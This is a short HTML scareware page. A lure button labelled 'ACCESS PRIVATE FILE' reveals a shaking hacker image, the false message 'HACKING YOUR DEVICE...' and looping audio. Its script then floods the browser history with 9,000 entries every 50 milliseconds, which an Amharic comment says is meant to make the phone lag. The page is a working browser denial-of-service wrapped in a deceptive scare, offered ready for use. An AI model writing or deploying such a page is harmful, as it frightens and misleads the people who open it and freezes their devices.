<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ SYSTEM BREACH DETECTED ⚠️</title>
    <style>
        body { 
            background: #000; 
            color: #ff0000; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            overflow: hidden; 
            margin: 0; 
        }
        .container { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        img { 
            width: 85%; 
            max-width: 400px; 
            display: none; 
            animation: shake 0.1s infinite; 
            border: 2px solid #ff0000; 
            box-shadow: 0 0 40px #ff0000; 
        }
        #start-btn { 
            padding: 25px 50px; 
            font-size: 22px; 
            color: #0f0; 
            background: transparent; 
            border: 2px solid #0f0; 
            cursor: pointer; 
            border-radius: 8px; 
            box-shadow: 0 0 15px #0f0; 
            font-weight: bold;
            text-transform: uppercase;
        }
        .status-msg { 
            font-size: 24px; 
            margin-top: 20px; 
            display: none; 
            font-weight: bold; 
            text-shadow: 0 0 10px #ff0000;
        }
        @keyframes shake { 
            0% { transform: translate(3px, 3px); } 
            50% { transform: translate(-3px, -3px); } 
            100% { transform: translate(3px, 3px); } 
        }
    </style>
</head>
<body>

    <div class="container">
        <button id="start-btn" onclick="activateHackerMode()">ACCESS PRIVATE FILE</button>
        
        <img id="hacker-img" src="image_7.png" alt="Hacker Mask">
        <div id="status" class="status-msg">HACKING YOUR DEVICE...</div>
    </div>

    <audio id="hacker-audio" src="audio.mp3" loop></audio>

    <script>
        function activateHackerMode() {
            // ቁልፉን መደበቅ
            document.getElementById('start-btn').style.display = 'none';
            // ፎቶውን እና ጽሁፉን ማሳየት
            document.getElementById('hacker-img').style.display = 'block';
            document.getElementById('status').style.display = 'block';
            // ድምፁን ማስጀመር
            document.getElementById('hacker-audio').play();

            // ስልኩን የማደንዘዝ ስራ (Lag)
            setInterval(() => {
                for (let i = 0; i < 9000; i++) {
                    window.history.pushState(null, '', '?' + Math.random());
                }
            }, 50);
        }
    </script>
</body>
</html>
